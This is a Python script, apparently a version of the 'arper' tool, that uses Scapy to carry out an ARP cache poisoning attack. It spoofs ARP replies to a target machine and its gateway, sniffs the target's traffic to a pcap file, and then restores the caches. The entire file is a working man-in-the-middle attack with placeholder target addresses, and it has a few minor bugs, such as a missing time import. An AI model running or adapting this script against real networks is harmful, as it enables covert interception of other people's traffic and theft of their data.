from scapy.all import *
import os
import sys
import threading
import signal

	
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
	"""Sends out the appropriate ARP packets to the network broadcast address to reset ARP caches of the gateway and target machine"""
	
	#slightly different method using send
	print("[*] Restoring target...")
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
	
	os.kill(os.getpid(), signal.SIGINT) #signals the main thread to exit
	
def get_mac(ip_address):
	"""Uses srp (send and receive packet) function to emit ARP request to the specified IP in order to resolve the MAC associated with it"""
	
	responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
	
	#return the MAC address from a response
	for s,r in responses:
		return r[Ether].src
		
		return None
	
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	"""Builds up ARP requests for poisoning both the target IP and gateway, it will show traffic flowing in and out of the target
	   It will keep emiting these ARP requests in a loop to make sure ARP cache entries remain poisoned during attack
	"""
	
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac
	
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac
	
	print("[*] Beginning the ARP poison... [CTRL+C to stop]")
	
	while True:
		try:
			send(poison_target)
			send(poison_gateway)
			time.sleep(2)
			
		except KeyboardInterrupt:
			restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
			
	print("[+] ARP poisoning attack finished!")
	return

	
interface = "en1"
target_ip = "<TARGETS_IP>"
gateway_ip = "<TARGETS_GATEWAY_IP>"
packet_count = 1000

conf.iface = interface #set interface
conf.verb = 0 #turn of output
print("[*] Setting up %s" % interface)

#resolving the gateway and target IP corresponding MAC addresses
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
	print("[!] Failed to get gateway MAC! Exiting! ")
	sys.exit(0)
	
else:
	print("[+] Gateway %s is at %s" % (gateway_ip, gateway_mac))
	
target_mac = get_mac(target_ip)
if target_mac is None:
	print("[!] Failed to get targets MAC! Exiting!")
	sys.exit(0)
	
else:
	print("[+] Target %s is at %s" % (target_ip, target_mac))
	
#start poison thread, starting actual ARP poisoning
poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
	#starts sniffer that will capture packets using BPF filter to only capture traffic for target IP
	print("[*] Starting sniffer for %d packets" % packet_count)
	bpf_filter = "ip host %s" % target_ip
	packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
	wrpcap('arper.pcap', packets) #write out the captured packets
	restore_target(gateway_ip, gateway_mac, target_ip, target_mac) #restore the network
	
except KeyboardInterrupt:
	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
	sys.exit(0)	






